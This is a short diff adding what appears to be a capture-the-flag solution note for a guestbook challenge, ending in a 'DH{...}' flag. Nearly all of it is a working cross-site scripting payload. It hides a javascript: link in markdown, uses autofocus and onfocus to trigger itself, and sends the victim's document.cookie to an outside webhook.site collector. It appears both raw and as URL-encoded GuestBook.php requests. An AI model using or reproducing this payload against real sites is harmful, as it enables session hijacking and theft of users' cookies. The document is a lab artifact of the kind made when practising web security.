@@ -1,0 +1,6 @@
+https://webhook.site/75559274-ab8c-4aab-916a-6f525ad73278
+[xss](javascript:location=`https://webhook.site/75559274-ab8c-4aab-916a-6f525ad73278?cookie=`+document.cookie' id='autoClick' autofocus onfocus='location=this.href')
+GuestBook.php?content=%5Bxss%5D%28javascript%3Alocation%3D%60https%3A%2F%2Fwebhook.site/75559274-ab8c-4aab-916a-6f525ad73278%3Fcookie%3D%60%2Bdocument.cookie%27%20id%3D%27autoClick%27%20autofocus%20onfocus%3D%27location%3Dthis.href%27%29
+GuestBook.php?content=%5Bxss%5D%28javascript%3Alocation%3D%60https%3A%2F%2Fwebhook.site%2F75559274-ab8c-4aab-916a-6f525ad73278%3Fcookie%3D%60%2Bdocument.cookie%27%20id%3D%27autoClick%27%20autofocus%20onfocus%3D%27location%3Dthis.href%27%29
+
+DH{26763025e32e6b24fedfc3206054d6a7}
